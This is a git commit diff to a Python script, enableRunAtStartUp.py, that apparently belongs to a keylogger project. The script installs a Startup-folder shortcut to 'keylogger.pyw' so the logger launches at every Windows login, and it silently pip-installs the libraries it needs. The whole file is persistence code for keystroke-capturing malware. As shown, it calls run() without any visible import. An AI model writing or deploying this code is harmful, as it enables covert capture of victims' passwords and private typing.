1ab0d12f3d615f56ed409871fa23bff6af9a1649
Saajan Shrestha <shresthasaajan31@gmail.com>
2020-08-30 13:46:36 +0545

    Updated

--- enableRunAtStartUp.py
+++ enableRunAtStartUp.py
@@ -1,13 +1,29 @@
 import os, sys
-import winshell
+
 # print("Enabling to run at StartUp")
 def createBat():
-    user = os.environ["USERPROFILE"] + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+    user = (
+        os.environ["USERPROFILE"]
+        + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+    )
     if not os.path.isfile("{0}\\startKeylogger.lnk".format(user)):
+        check_elevate = run(
+            ["pip", "show", "winshell"], shell=True, capture_output=True
+        ).returncode
+        if check_elevate == 1:
+            print("INSTALLING WINSHELL...")
+            run(["pip", "install", "winshell"], shell=True)
+        check_elevate = run(
+            ["pip", "show", "pypiwin32"], shell=True, capture_output=True
+        ).returncode
+        if check_elevate == 1:
+            print("INSTALLING PYPIWIN32...")
+            run(["pip", "install", "pypiwin32"], shell=True)
+        import winshell
+
         path = os.getcwd()
         link_filepath = os.path.join(user, "startKeylogger.lnk")
         with winshell.shortcut(link_filepath) as link:
             link.working_directory = path
             link.path = f"{path}\\keylogger.pyw"
             link.description = "Shortcut to keylogger"
-    
